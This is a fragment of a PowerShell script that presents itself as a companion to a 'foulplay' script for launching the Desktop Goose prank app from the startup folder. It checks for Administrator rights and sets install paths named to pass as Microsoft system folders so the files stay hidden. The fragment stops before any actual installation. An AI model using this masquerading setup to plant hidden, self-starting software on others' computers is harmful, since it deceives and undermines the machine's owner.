<#
.SYNOPSIS
    A script to compliment the foulplay script. Uses the desktop goose app to spawn a goose using the startup folder. 
#>

# Determine execution context (Admin vs User) and set paths
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
if ($isAdmin) {
    Write-Host "Context: Administrator" -ForegroundColor Cyan
    $installPath = "$env:ProgramFiles\WinProcs"
    # create backup location to hide files
    $backupPath = "$env:ProgramFiles\Microsoft Procs"
} else {
    Write-Host "Context: Standard User ($env:USERNAME)" -ForegroundColor Cyan
    $installPath = "$env:USERPROFILE\AppData\Local\WinProcs"
    # create backup location to hide files
    $backupPath = "$env:USERPROFILE\AppData\Local\Microsoft Procs"
}












